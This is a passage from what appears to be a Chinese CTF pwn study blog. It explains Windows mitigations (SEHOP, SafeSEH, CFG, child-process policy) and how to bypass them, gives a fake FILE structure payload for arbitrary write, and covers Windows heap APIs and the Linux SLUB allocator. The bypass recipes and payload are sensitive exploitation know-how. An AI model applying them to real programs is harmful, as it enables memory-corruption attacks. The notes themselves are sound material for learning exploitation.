class="type">int</span>)Handler</span><br><span class="line">            || !RtlIsValidHandler(Handler, ProcessInformation, pContext) )<span class="comment">// safeSEH</span></span><br><span class="line">          &#123;</span><br><span class="line">            pExcptRec-&gt;ExceptionFlags |= EXCEPTION_STACK_INVALID;<span class="comment">// EXCEPTION_STACK_INVALID</span></span><br><span class="line">            <span class="keyword">goto</span> DispatchExit;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中 RtlpIsValidExceptionChain 内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">RtlpIsValidExceptionChain</span><span class="params">(</span></span><br><span class="line"><span class="params">        _EXCEPTION_REGISTRATION_RECORD *ExceptionList,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> StackLimit,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> StackBase,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> StackLimita)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> stackBase; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> stackLimit; <span class="comment">// eax</span></span><br><span class="line">  _EXCEPTION_DISPOSITION (__stdcall *Handler)(_EXCEPTION_RECORD *, <span class="type">void</span> *, _CONTEXT *, <span class="type">void</span> *); <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  stackBase = StackBase;</span><br><span class="line">  stackLimit = StackLimit;</span><br><span class="line">  <span class="keyword">while</span> ( ExceptionList != (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( stackLimit &gt; (<span class="type">unsigned</span> <span class="type">int</span>)ExceptionList )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)ExceptionList &gt;= stackBase - <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)ExceptionList &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Handler = ExceptionList-&gt;Handler;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)Handler &lt; stackBase &amp;&amp; StackLimit &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)Handler )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ExceptionList-&gt;Next == (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      stackBase = StackBase;</span><br><span class="line">      <span class="keyword">if</span> ( (NtCurrentTeb()-&gt;SameTebFlags &amp; <span class="number">0x200</span>) != <span class="number">0</span> &amp;&amp; Handler != RtlpFinalExceptionHandler )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stackLimit = (<span class="type">int</span>)&amp;ExceptionList[<span class="number">1</span>];</span><br><span class="line">    ExceptionList = ExceptionList-&gt;Next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要检查 SEH 是否满足如下条件：</p><ul><li>SEH 节点在栈中</li><li>SEH 节点指向的 Handler 不在栈中</li><li>SEH 节点地址 4 字节对齐</li><li>SEH 最后一个节点的 Next 为 -1 且 Handler 为 RtlpFinalExceptionHandler</li><li>SEH 节点的 Next 指向的下一个节点的地址一定大于当前节点</li></ul><p>只要泄露栈地址就可以伪造 SEH 链表绕过 SEHOP 检查(直接修改栈上的SEH节点为SEH异常处理链的最后一块地址)</p><h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>在 <code>ntdll!RtlDispatchException</code> 中调用 <code>RtlIsValidHandler</code> 进一步检查 SEH 链表，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (handler image has a SafeSEH table) &#123; <span class="comment">//检查异常处理程序所在的模块是否包含SafeSEH表（编译时通过/GS选项生成）</span></span><br><span class="line">        <span class="keyword">if</span> (handler found in the table) <span class="comment">//处理程序在表中</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ExecuteDispatchEnable|ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">// 允许在加载模块内存空间外执行</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a executeable page) &#123;</span><br><span class="line">        <span class="keyword">if</span> (handler is in an image) &#123;  <span class="comment">//Handler 位于一个模块</span></span><br><span class="line">            <span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)  <span class="comment">//标志明确表示“本模块不使用 SEH”</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="keyword">if</span> (image is a .NET assembly whith the ILonly flag <span class="built_in">set</span>) <span class="comment">//该模块是一个纯粹的 .NET 程序集，它的代码不是原生机器码，不能直接作为 SEH 处理程序</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (handler is not in an image) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; </span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>Handler</code> 覆盖指向有 SEH 但没有 SafeSEH 保护的 Image 即可绕过。</p><h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h3><p>即 Control Flow Guard ，为函数指针创建白名单，每次调用前都会检查。</p><p>windows下的是前向CFI：只考略call，jump的直接跳转和间接跳转，没有计算ret的情况，会在每一个跳转间自动插入一小段检查代码，这段代码会去调用一个核心的验证函数 <code>__guard_check_icall_fptr</code></p><p>Windows CFG实现还依赖于bitmap表，bitmap表中的两位与实际地址的16byte一一对应：</p><ul><li>00：该地址范围没有有效的跳转地址</li><li>01：地址范围包含导出抑制表目标</li><li>10：只有16位对其的地址有效（该范围的第一个地址）</li><li>11：地址范围的所有地址均有效</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">LdrpValidateUserCallTarget</span><span class="params">(<span class="type">unsigned</span> __int64 FuncPtr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 BitMap; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 Offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  BitMap = CFGBitMap[FuncPtr &gt;&gt; <span class="number">9</span>];</span><br><span class="line">  Offset = FuncPtr &gt;&gt; <span class="number">3</span>;  <span class="comment">//&amp; 0x3F;</span></span><br><span class="line">  <span class="keyword">if</span> ( (FuncPtr &amp; <span class="number">0xF</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Offset &amp;= ~<span class="number">1u</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( !_bittest64(&amp;BitMap, Offset) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">      LdrpHandleInvalidUserCallTarget();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="keyword">if</span> ( _bittest64(&amp;BitMap, Offset | <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !_bittest64(&amp;BitMap, Offset) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法：ROP（利用一些在白名单里的跳转gadget）</p><h3 id="PROCESS-MITIGATION-CHILD-PROCESS-POLICY"><a href="#PROCESS-MITIGATION-CHILD-PROCESS-POLICY" class="headerlink" title="PROCESS_MITIGATION_CHILD_PROCESS_POLICY"></a>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</h3><p><code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 是Windows操作系统中的一项安全功能。该功能允许管理员指定如何创建子进程以及它们从其父进程继承哪些安全设置。该功能可用于防止子进程继承某些安全设置，例如创建新进程或访问某些系统资源的能力。</p><p>可用于配置 <code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 的几个选项，包括：</p><ul><li><code>NoChildProcessCreation</code>：防止创建子进程。</li><li><code>ParentProcess</code>：允许子进程继承与其父进程相同的安全设置。</li><li><code>ChildProcessRestricted</code>：将子进程的安全设置限制为其父进程安全设置的子集。</li></ul><p>可使用如下命令查询 <code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 是否已开启（在管理员权限的 Powershell 中查询）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ProcessMitigation -Name 程序名</span><br></pre></td></tr></table></figure><p>可以使用如下命令开启 <code>ChildProcessRestricted</code> 保护，效果是不能执行 <code>system(&quot;cmd.exe&quot;)</code>，只能 ORW 获取 flag 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ProcessMitigation -Name 程序名 -Enable DisallowChildProcessCreation</span><br></pre></td></tr></table></figure><h2 id="windows-IO-FILE"><a href="#windows-IO-FILE" class="headerlink" title="windows IO_FILE"></a>windows IO_FILE</h2><p>Windows 的 <code>FILE</code> 结构体定义在 <code>ucrtbase.dll</code> 中，其结构体是实际上是 <code>__crt_stdio_stream_data</code>，大小为 0x58 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    _RTL_CRITICAL_SECTION_DEBUG *DebugInfo;</span><br><span class="line">    <span class="type">int</span> LockCount;</span><br><span class="line">    <span class="type">int</span> RecursionCount;</span><br><span class="line">    <span class="type">void</span> *OwningThread;</span><br><span class="line">    <span class="type">void</span> *LockSemaphore;</span><br><span class="line">    <span class="type">unsigned</span> __int64 SpinCount;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">crt_stdio_stream_data</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        FILE _public_file;</span><br><span class="line">        <span class="type">char</span>* _ptr; <span class="comment">// 当前结构指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *_base; <span class="comment">// 输入缓冲区基址</span></span><br><span class="line">    <span class="type">int</span> _cnt; <span class="comment">// 没有被读出的缓冲区剩余大小</span></span><br><span class="line">    <span class="type">int</span> _flags;</span><br><span class="line">    <span class="type">int</span> _file; <span class="comment">// 文件描述符</span></span><br><span class="line">    <span class="type">int</span> _charbuf; <span class="comment">// Local buffer</span></span><br><span class="line">    <span class="type">int</span> _bufsiz; <span class="comment">// buffer size</span></span><br><span class="line">    <span class="type">char</span> *_tmpfname;</span><br><span class="line">    _RTL_CRITICAL_SECTION _lock; <span class="comment">// lock</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果要实现任意地址读，<code>fwrite</code>：</p><ul><li>设置 <code>_file</code> 文件描述符为 <code>stdout</code> 输出符</li><li>设置 <code>_flag</code> 为 <code>_IOWRITE | IOBUFFER_USER | _IOUPDATE</code></li><li>设置 <code>_cnt=0</code></li><li>设置 <code>_base&amp; _ptr</code> 指向读取的地址</li><li>设置 <code>_bufsize</code> 为输出的大小</li></ul><p>如果要实现任意地址写，<code>fread</code>：</p><ul><li>设置 <code>_file</code> 文件描述符为 <code>stdin</code> 输出符</li><li>设置 <code>_flag</code> 为 <code>_IOALLOCATED | _IOBUFFER_USER</code></li><li>设置 <code>_cnt=0</code></li><li>设置 <code>_base&amp; _ptr</code> 指向写入的地址</li><li>设置 <code>_bufsize</code> 为输入的大小</li></ul><p>程序在每次执行如下代码时会在进程的<strong>默认堆</strong>中申请一个 0x60 大小的 chunk 并将其填充为 <code>__crt_stdio_stream_data</code> 结构体然后将该结构体地址写入 <code>Stream</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen_s(&amp;Stream, <span class="string">&quot;magic.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果我们能够劫持 <code>Stream</code> 指针或者 UAF 修改 <code>__crt_stdio_stream_data</code> 结构体就可以在执行下面这段代码时实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread_s(buffer, size, <span class="number">1u</span>i64, size, Stream);</span><br></pre></td></tr></table></figure><p>具体伪造方式如下，主要操作是把 <code>_base</code> 指向要写入数据的地址，<code>_file</code> 设为 0 即标准输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fake_FILE = &#x27;&#x27;</span><br><span class="line">fake_FILE += p64(0)  # _ptr</span><br><span class="line">fake_FILE += p64(target_addr)  # _base</span><br><span class="line">fake_FILE += p32(0)  # _cnt</span><br><span class="line">fake_FILE += p32(0x2080)  # _flags</span><br><span class="line">fake_FILE += p32(0)  # _file = stdin(0)</span><br><span class="line">fake_FILE += p32(0)  # _charbuf</span><br><span class="line">fake_FILE += p64(0x200)  # _bufsiz</span><br><span class="line">fake_FILE += p64(0)  # _tmpfname</span><br><span class="line">fake_FILE += p64(0xffffffffffffffff)  # DebugInfo</span><br><span class="line">fake_FILE += p32(0xffffffff)  # LockCount</span><br><span class="line">fake_FILE += p32(0)  # RecursionCount</span><br><span class="line">fake_FILE += p64(0)  # OwningThread</span><br><span class="line">fake_FILE += p64(0)  # LockSemaphore</span><br><span class="line">fake_FILE += p64(0)  # SpinCount</span><br></pre></td></tr></table></figure><h2 id="windows-heap"><a href="#windows-heap" class="headerlink" title="windows heap"></a>windows heap</h2><h3 id="windbg上的堆相关命令"><a href="#windbg上的堆相关命令" class="headerlink" title="windbg上的堆相关命令"></a>windbg上的堆相关命令</h3><p><code>!heap</code> 打印当前进程所有堆</p><p><code>!heap -h</code> 可以查看当前进程所创建的堆空间</p><p><code>!heap -x address</code> 打印包含 address 的堆块的相关信息</p><p><code>!heap -i address</code> 显示 address 对应堆块的详细信息</p><p><code>!heap -v address</code> 检查堆是否损坏，address 为 heap 地址。例如伪造 <code>FreeList</code> 链表后可以用这个命令测试是否能通过检查。</p><h3 id="Windows-10下的堆类型"><a href="#Windows-10下的堆类型" class="headerlink" title="Windows 10下的堆类型"></a>Windows 10下的堆类型</h3><ol><li>NT Heap<ul><li>默认的内存管理器</li></ul></li><li>SegmentHeap<ul><li>win10新增的内存管理器</li><li>部分系统程序以及UWP(Universal Windows Platform)使用</li></ul></li></ol><h3 id="windows用户态进程堆"><a href="#windows用户态进程堆" class="headerlink" title="windows用户态进程堆"></a>windows用户态进程堆</h3><p>windows用户态进程的堆空间包含两种类型：</p><ul><li>Process Heap（默认），整个进程共享的堆，它包括两个部分：<ul><li>default heap ，其地址信息会存放于 _PEB 的 ProcessHeap 中，<code>GetProcessHeap()</code> 函数返回的就是这个堆的句柄。</li><li>crtheap(C&#x2F;C++运行时堆)，当你调用 <code>malloc</code>, <code>new</code> 等标准C&#x2F;C++库函数时，你使用的是C&#x2F;C++运行时库（CRT）管理的堆。<strong>CRT在初始化时会调用 <code>HeapCreate</code> 创建一个或多个自己的私有堆</strong>来管理内存，而不是直接使用进程的默认堆。</li></ul></li><li>Private Heap，通过 HeapCreate 创建的堆。</li></ul><h3 id="堆管理常见函数"><a href="#堆管理常见函数" class="headerlink" title="堆管理常见函数"></a>堆管理常见函数</h3><h4 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate"></a>HeapCreate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI HANDLE WINAPI <span class="title function_">HeapCreate</span> <span class="params">(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：创建一个新的堆对象。</li><li>参数：<ul><li><code>flOptions</code>：堆的选项标志。可以是以下标志的组合：<ul><li><code>HEAP_GENERATE_EXCEPTIONS</code>：在内存不足时引发异常。</li><li><code>HEAP_NO_SERIALIZE</code>：多线程访问堆时不进行同步。</li></ul></li><li><code>dwInitialSize</code>：堆的初始大小（以字节为单位）。如果为 0 ，则系统会选择一个默认的初始大小。</li><li><code>dwMaximumSize</code>：堆的最大大小（以字节为单位）。如果为 0 ，则堆的大小受系统的限制。</li></ul></li><li>返回值：<ul><li>如果操作成功，返回堆对象的句柄；</li><li>如果操作失败，返回 NULL 。</li></ul></li></ul><h4 id="HeapAlloc-HeapFree"><a href="#HeapAlloc-HeapFree" class="headerlink" title="HeapAlloc&#x2F;HeapFree"></a>HeapAlloc&#x2F;HeapFree</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI LPVOID WINAPI <span class="title function_">HeapAlloc</span> <span class="params">(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：在指定的堆中分配指定大小的内存块。</li><li>参数：<ul><li><code>hHeap</code>：要分配内存的堆的句柄。此句柄通常由HeapCreate函数创建。</li><li><code>dwFlags</code>：内存分配的标志。可以是以下标志的组合：<ul><li><code>HEAP_ZERO_MEMORY</code>：分配的内存块被初始化为零。</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>：在分配内存时发生错误时生成异常。</li><li><code>HEAP_NO_SERIALIZE</code>：禁用堆的同步机制，使多线程访问堆时不同步。</li></ul></li><li><code>dwBytes</code>：要分配的内存块的大小（以字节为单位）。</li></ul></li><li>返回值：<ul><li>如果分配成功，返回指向分配的内存块的指针；</li><li>如果分配失败，返回 NULL 。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI WINBOOL WINAPI <span class="title function_">HeapFree</span><span class="params">(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem)</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值：True&#x2F;False</p></li><li><p>参数：</p><ul><li><code>hHeap</code>：要释放内存的堆的句柄。</li><li><code>dwFlags</code>：释放内存的标志。可以是以下标志的组合：<ul><li><code>HEAP_NO_SERIALIZE</code>：禁用堆的同步机制，使多线程访问堆时不同步。</li></ul></li><li><code>lpMem</code>：要释放的内存块的指针。</li></ul></li></ul><h4 id="VirtualAlloc-VirtualFree"><a href="#VirtualAlloc-VirtualFree" class="headerlink" title="VirtualAlloc &#x2F; VirtualFree"></a>VirtualAlloc &#x2F; VirtualFree</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI LPVOID WINAPI <span class="title function_">VirtualAlloc</span> <span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>作用：为进程保留或提交指定大小的虚拟内存区域。</p></li><li><p>参数：</p><ul><li><code>lpAddress</code>：要保留或提交的虚拟内存区域的首字节地址。可以指定为NULL，表示由系统选择地址。</li><li><code>dwSize</code>：要保留或提交的虚拟内存区域的大小（以字节为单位）。</li><li><code>flAllocationType</code>：内存分配的类型标志。可以是以下标志的组合：<ul><li><code>MEM_COMMIT</code>：提交虚拟内存区域。</li><li><code>MEM_RESERVE</code>：保留虚拟内存区域。</li><li><code>MEM_RESET</code>：将虚拟内存区域的内容重置为零。</li><li><code>MEM_RESET_UNDO</code>：撤消对虚拟内存区域的重置操作。</li></ul></li><li><code>flProtect</code>：内存保护标志，指定分配的内存区域的访问权限和保护级别。</li></ul></li><li><p>返回值：</p><ul><li>如果操作成功，返回分配的虚拟内存区域的首字节地址；</li><li>如果操作失败，返回 NULL 。</li></ul></li><li><p><code>VirtualAlloc</code> 是在比“堆”更低的层面上操作内存。 <strong>堆管理器（Heap Manager）本身就是构建在 <code>VirtualAlloc</code> 之上的</strong> 。当你创建一个堆（<code>HeapCreate</code>）或者堆需要更多内存时，堆管理器会在内部调用 <code>VirtualAlloc</code> 来向操作系统申请大块的虚拟地址空间（保留或提交），然后再将这些大块内存细分，管理后分配给 <code>HeapAlloc</code> 的调用者。</p></li><li><p><strong>关键区别</strong> ：<code>VirtualAlloc</code> 操作的是页（Page，通常是4KB）的整数倍，而 <code>HeapAlloc</code> 可以分配任意字节大小的内存块。</p></li></ul><h4 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc &#x2F; free"></a>malloc &#x2F; free</h4><ul><li>这是C语言标准库的函数。</li><li><strong>底层实现</strong> : 在Windows上，<code>malloc</code> 和 <code>free</code> 是由C&#x2F;C++运行时库实现的。它们最终会调用Windows的堆API（如 <code>HeapAlloc</code>&#x2F;<code>HeapFree</code>）来向操作系统申请和释放内存。它们管理的是CRT自己的 <strong>私有堆</strong> 。</li><li><strong>不能混用内存分配函数系列：</strong> 例如，由 <code>malloc</code> 分配的内存必须由 <code>free</code> 释放；由 <code>HeapAlloc</code> 分配的内存必须由 <code>HeapFree</code> 释放；由 <code>new</code> 分配的内存必须由 <code>delete</code> 释放。混用会导致堆损坏，引发程序崩溃或难以调试的错误。</li></ul>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel学习（二）</title>
      <link href="/2025/10/03/2025-10-3-learning_linux_kernel_2/"/>
      <url>/2025/10/03/2025-10-3-learning_linux_kernel_2/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h1><h2 id="kernel-pwn学习（二）"><a href="#kernel-pwn学习（二）" class="headerlink" title="kernel pwn学习（二）"></a>kernel pwn学习（二）</h2><h3 id="内核堆管理机制（参考：Kernel-2-内核堆基础与-SLUB-分配器-nebuu-la-）"><a href="#内核堆管理机制（参考：Kernel-2-内核堆基础与-SLUB-分配器-nebuu-la-）" class="headerlink" title="内核堆管理机制（参考：Kernel 2 - 内核堆基础与 SLUB 分配器 (nebuu.la)）"></a>内核堆管理机制（参考：<a href="https://eastxuelian.nebuu.la/kernel/Kernel-How2Kernel-0x02-heap-basics">Kernel 2 - 内核堆基础与 SLUB 分配器 (nebuu.la)</a>）</h3><h4 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h4><p>伙伴系统（<code>Buddy System</code>）：区级别的内存管理系统，以 <strong>页</strong> 为粒度进行内存分配，并管理所有物理内存。在内存的分配与释放方面，<code>Buddy System</code> 按照空闲页面的连续大小进行分阶管理，表现为zone结构体中的 <code>free_area</code>：</p><p><img src="/image/learning_linux_kernel_2/1740887994937.png" alt="1740887994937"></p><p>其中每块内存大小为 <code>2^order * page_size</code></p><h4 id="Slab-allocator"><a href="#Slab-allocator" class="headerlink" title="Slab allocator"></a>Slab allocator</h4><p><code>SLAB</code>分配器用于管理从 <code>Buddy System</code> 申请到的内存，分割成多个小的 <code>object</code> 返回给上层调用者。</p><h5 id="slab-结构体"><a href="#slab-结构体" class="headerlink" title="slab 结构体"></a>slab 结构体</h5><ul><li>复用 <code>page</code> 结构体</li><li>作为单份 <code>Object</code> 池</li><li>其中关键成员包括：<ul><li><code>slab_cache</code>：<code>kmem_cache</code> 类型，指向对应的内存池</li><li><code>slab_list</code>：多个相同用途的 <code>slab</code> 组成的双向链表</li><li><code>freelist</code>：指向空闲对象的单向链表，以 <code>NULL</code> 结尾</li></ul></li></ul><p><img src="/image/learning_linux_kernel_2/1740888420250.png" alt="1740888420250"></p><h5 id="kmem-cache-结构体"><a href="#kmem-cache-结构体" class="headerlink" title="kmem_cache 结构体"></a>kmem_cache 结构体</h5><ul><li>所有 <code>kmem_cache</code> 构成双向链表，且有一个全局数组 <code>kmalloc_caches</code> 存放通用 <code>kmem_cache</code>，大小为 <code>2</code>的幂次方，在分配时，其会选择一个大于其大小的 <code>2</code>的幂次方的值。（此外，为了减少内存碎片，还有一些特殊大小的 <code>slub</code>，例如 <code>96</code>字节和 <code>192</code>字节。）</li><li>其中关键成员包括：<ul><li><code>cpu_slab</code>：<code>struct kmem_cache_cpu __percpu *</code> 类型，指向当前 <code>CPU</code> 独占的内存池（同一个 <code>CPU</code> 访问自己的内存池不用上锁，优先从中分配、释放，效率高，通过 <code>gs</code>寄存器作为 <code>percpu</code>基址进行寻址，做题时先绑定 <code>CPU</code>）</li><li><code>node</code>：<code>struct kmem_cache_node *[]</code> 类型，存放多个不同 <code>node</code> 的后备内存池</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  84 */</span> <span 